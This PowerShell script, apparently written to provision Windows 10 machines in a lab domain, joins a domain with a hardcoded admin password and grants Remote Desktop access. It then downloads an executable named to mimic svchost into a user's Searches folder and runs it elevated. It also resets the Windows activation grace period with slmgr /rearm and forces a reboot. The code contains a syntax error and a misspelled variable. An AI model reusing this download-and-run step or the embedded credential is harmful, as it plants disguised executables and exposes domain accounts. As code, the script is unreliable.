### Basic non-Parameterized ps1 script to allow introduction of various limited-provisioning commands to Windows 10
param(
  [String]$defAdminUsr, 
  [String]$defAdminPwd,
  [String]$domain,
  [String]$domAdminUsr,
  [String]$domAdminPwd,
  [String]$localpath,
  [String]$downloadlink,
)

$localcred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $defAdminUsr,($defAdminPwd | convertto-securestring -asplaintext -force)
$domaincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($domain + "\" + $domAdminUsr),($domAdminPwd | convertto-securestring -asplaintext -force)
add-computer -domainname $domain -domaincredential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "atlas.lab\atlasadmin",("cmtsAdmin12#" | convertto-securestring -asplaintext -force))

Add-LocalGroupMember -group "Remote Desktop Users" -member $domAdminUsr

Invoke-WebRequest -uri $downloadlink -OutFile $localpath

# https://github.com/cybermias/publicrep/raw/master/guacconf/Python.37.svchost.exe
# c:\users\cmtsadmin\searches\python37.svchost.exe 

Start-Process powershell.exe -verb runas -ArgumentList "start-process -filepath$localpat -Credential $localcred"

cscript c:\windows\system32\slmgr.vbs /rearm
shutdown /r /t 03
